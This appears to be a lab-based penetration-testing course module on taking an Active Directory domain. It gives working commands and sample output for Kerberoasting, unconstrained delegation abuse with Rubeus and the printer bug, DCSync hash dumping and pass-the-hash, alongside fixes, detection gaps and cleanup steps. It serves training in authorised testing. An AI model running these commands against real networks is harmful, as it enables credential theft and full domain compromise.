# 06 - Active Directory Attacks

Taking the domain. This is where an internal test on a Windows network is decided.

---

## The Idea

Active Directory is the central directory that every Windows machine trusts. Compromise it and you own every machine, every account, and every file at once.

You rarely take it with an exploit. You take it with misconfigurations, chained together. Every attack here is a default or a shortcut that nobody removed.

**One valid domain credential is the entry ticket.** You have `svc_sql` from the spray. Everything below starts from there.

---

## Kerberoasting

The attack that turns any domain user into a shot at every service account password.

### How it works

Any domain user can request a service ticket for any account that has a Service Principal Name. That ticket is encrypted with the service account's password. Request it, take it offline, crack it. The account never sees a failed login, because nothing failed.

`svc_sql` has an SPN. So does any other service account. You can roast all of them.

### Run it

```bash
# Request tickets for every account with an SPN
impacket-GetUserSPNs ptlab.local/svc_sql:'Autumn2024!' -dc-ip 10.50.10.10 -request
```

```text
ServicePrincipalName          Name       MemberOf
----------------------------  ---------  ------------------
MSSQLSvc/srv-file01:1433       svc_sql    Domain Users

$krb5tgs$23$*svc_sql$PTLAB.LOCAL$...
```

### Crack it

```bash
hashcat -m 13100 tickets.txt /usr/share/wordlists/rockyou.txt
```

`-m 13100` is the Kerberoasting mode. This is finding PT-02.

**The fix is not a detection, it is a password.** A service account with a 25-character random password produces a ticket that will not crack in any reasonable time. The vulnerability is the weak password, not the protocol.

---

## Map It With BloodHound

Before going further, let BloodHound show you the shortest path. You collected it in module 03.

Run the query **Shortest Paths to Domain Admins** and the query **Find Computers with Unconstrained Delegation**.

BloodHound draws the line straight to SRV-FILE01 and its delegation rights. That is the path. Everything else is executing it.

![Attack path from a service account to Domain Admin](images/attack-path.svg)

---

## Unconstrained Delegation

The finding that ends the engagement. This is PT-04.

### What it is

Delegation lets a service act on behalf of a user. **Unconstrained** delegation is the dangerous version: any user who authenticates to that machine leaves their full ticket-granting ticket in its memory. Whoever controls the machine can grab those tickets and become those users.

SRV-FILE01 has unconstrained delegation set, and it is not a domain controller. It never should have this.

### The attack

You have local SYSTEM on SRV-FILE01 from module 05. Now:

```text
1. Monitor the machine for incoming tickets
2. Coerce a domain controller to authenticate to it
3. Capture the domain controller's ticket
4. Use that ticket to take the domain
```

```powershell
# On SRV-FILE01, as SYSTEM, watch for tickets
.\Rubeus.exe monitor /interval:5 /nowrap
```

```bash
# From Kali, force DC01 to authenticate to SRV-FILE01
impacket-printerbug ptlab.local/svc_sql:'Autumn2024!'@10.50.10.10 SRV-FILE01
```

The printer bug forces DC01 to connect to SRV-FILE01. Because SRV-FILE01 has unconstrained delegation, DC01 leaves its ticket-granting ticket behind. Rubeus captures it.

```text
[+] Ticket cache for DC01$ captured
doIFuj...base64 TGT...
```

### Use the captured ticket

```powershell
.\Rubeus.exe ptt /ticket:doIFuj...
```

Now your session holds the domain controller's own ticket. You are, effectively, the domain controller.

---

## DCSync

With the domain controller's ticket, ask the directory for every password hash in the domain. This is what DCSync does: it pretends to be a domain controller asking another for replication data, which is exactly the password database.

```bash
# Dump the entire domain's hashes, including the krbtgt account
impacket-secretsdump -just-dc ptlab.local/DC01\$@10.50.10.10 -k -no-pass
```

```text
Administrator:500:aad3b435...:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435...:...
ptlab.local\itsupport:1105:aad3b435...:...
```

**You now have every password hash in the domain.** The `krbtgt` hash is the crown jewel, because it lets you forge a golden ticket, a ticket-granting ticket for any user that the domain will accept indefinitely.

This is full domain compromise. **47 minutes from the first packet.**

### DCSync is one of the missed detections

There was no rule for DCSync in [SOC-01](../Junior-SOC-Analyst/). Replication requests from a non-domain-controller account are the signal, and detecting them needs directory service auditing that was not enabled. That gap is recorded honestly in module 09.

---

## Pass the Hash

You do not always need to crack a hash. Windows will often accept the hash itself in place of the password.

```bash
# Authenticate with the Administrator hash, no cracking
netexec smb 10.50.10.20 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0
impacket-psexec ptlab.local/Administrator@10.50.10.20 -hashes :31d6cfe0...
```

This is how the domain hashes from DCSync turn into access on any machine. It is finding PT-03 at domain scale, and it is covered further in module 07.

---

## The Chain, Start to Finish

Each step used the access from the one before.

```text
1. Anonymous enumeration    ->  user list                    (PT-05, PT-06)
2. Password spray           ->  svc_sql credential           (PT-01)
3. Kerberoasting            ->  more service passwords        (PT-02)
4. Local escalation         ->  SYSTEM on SRV-FILE01          (module 05)
5. Unconstrained delegation ->  DC01's ticket                 (PT-04)
6. DCSync                   ->  every hash in the domain      (domain owned)
```

**Not one of those was a software vulnerability.** Every step was a configuration that should have been different. That is the finding that matters most and it is the theme of the whole report.

---

## Cleanup

Everything you did leaves artefacts. Remove them.

```text
1. Delete any tickets injected into sessions
2. Remove any tools uploaded to hosts
3. Note the golden ticket capability but do not create persistence
4. Roll back the snapshots after documenting
```

In a real engagement you also tell the client immediately if you achieve domain compromise. It changes the risk picture and they may want to act before the report is finished.

---

## Checklist

- [ ] Kerberoasting run, tickets cracked, service passwords recovered
- [ ] BloodHound path to Domain Admin identified
- [ ] Unconstrained delegation abused, domain controller ticket captured
- [ ] DCSync run, domain hashes dumped
- [ ] Pass the hash confirmed against a target
- [ ] The full chain documented step by step with evidence
- [ ] Noted which steps the blue team side would and would not catch
- [ ] All artefacts cleaned up

---

Next: [07-Lateral-Movement.md](07-Lateral-Movement.md)
